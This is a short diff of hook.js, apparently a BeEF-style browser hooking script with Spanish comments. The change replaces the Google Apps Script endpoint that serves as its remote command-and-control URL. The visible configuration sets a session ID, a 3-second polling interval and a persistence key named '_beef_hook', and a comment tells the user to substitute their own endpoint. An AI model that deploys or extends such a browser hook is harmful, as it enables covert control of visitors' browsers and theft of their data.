@@ -1,7 +1,7 @@
 // hook.js
 (function() {
   // Configuración - REEMPLAZA ESTOS VALORES
-  var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzf4mu9jDr3hnFwsVlOMG7YUHlWZhW6VxbPvEhI_vX3sqXRjCA0C3qGdvbkwQqF2yFR/exec"; // Tu URL de Apps Script
+  var SCRIPT_URL = "https://script.google.com/macros/s/AKfycby3MnJIveibcnyrdOor9BX2gQRltpEY_ik1yGtEoKmH1h_oChJz7HA3zvNCmCYlSI0F/exec"; // Tu URL de Apps Script
   var SESSION_ID = generateSessionId();
   var CHECK_INTERVAL = 3000; // 3 segundos
   var PERSISTENCE_KEY = '_beef_hook';
